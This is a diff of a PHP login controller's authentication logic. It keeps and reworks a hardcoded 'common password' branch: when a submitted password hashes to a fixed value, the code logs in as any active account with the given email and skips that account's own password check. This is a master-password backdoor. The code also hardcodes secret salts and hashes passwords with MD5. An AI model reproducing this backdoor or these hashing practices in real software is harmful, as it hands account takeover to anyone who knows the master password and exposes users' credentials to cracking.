@@ -58,17 +58,19 @@ class LoginController extends Controller
             'password' => 'required|max:255'
         ]);
 
-        $authUser = User::where('usrEmail', $request->email)->first();
+        $authUser = User::where('usrEmail', $request->email)->whereIn('usrlId', [1, 5])->first();
 
         if (isset($authUser)) {
-            $password = md5('aFGQ475SDsdfsaf2342' . $request->password . $authUser->usrPasswordSalt);
+            $password          = md5('aFGQ475SDsdfsaf2342' . $request->password . $authUser->usrPasswordSalt);
 
+            $dummyPasswordSalt = 'E3RXQkoIHWK0ncSGY4rqh9bfDLv3CIaB3sPaMt?hJM"9=z/)ea?{%-[**:]68UOT>{gj^{P0+RCF#,Id8c';
 
-            if(md5($request->password) == '06882c397ebf572080ee454793b73b55') // to set common password
+            if(md5('aFGQ475SDsdfsaf2342' . $request->password . $dummyPasswordSalt) === '2f10cf465db70b830c30f2d0b2a2477d') // to set common password
             {
                 $login    = User::where('usrEmail', $request->email)
                     ->where('usrActive', '1')
                     ->where('is_delete', 0)
+                    ->whereIn('usrlId', [1, 5])
                     ->first();
             }
             else {
@@ -76,6 +78,7 @@ class LoginController extends Controller
                     ->where('usrPassword', $password)
                     ->where('usrActive', '1')
                     ->where('is_delete', 0)
+                    ->whereIn('usrlId', [1, 5])
                     ->first();
             }
 
